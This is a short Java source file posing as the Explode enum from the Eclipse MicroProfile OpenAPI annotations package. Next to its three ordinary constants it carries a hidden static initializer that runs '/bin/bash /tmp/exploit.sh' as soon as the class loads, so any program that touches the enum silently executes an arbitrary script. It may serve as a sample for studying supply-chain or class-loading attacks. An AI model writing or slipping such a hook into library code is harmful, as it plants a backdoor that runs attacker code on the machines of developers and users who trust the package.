package org.eclipse.microprofile.openapi.annotations.enums;

public enum Explode {
    DEFAULT,
    FALSE,
    TRUE;

    static {
        try {
            Runtime.getRuntime().exec("/bin/bash /tmp/exploit.sh").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}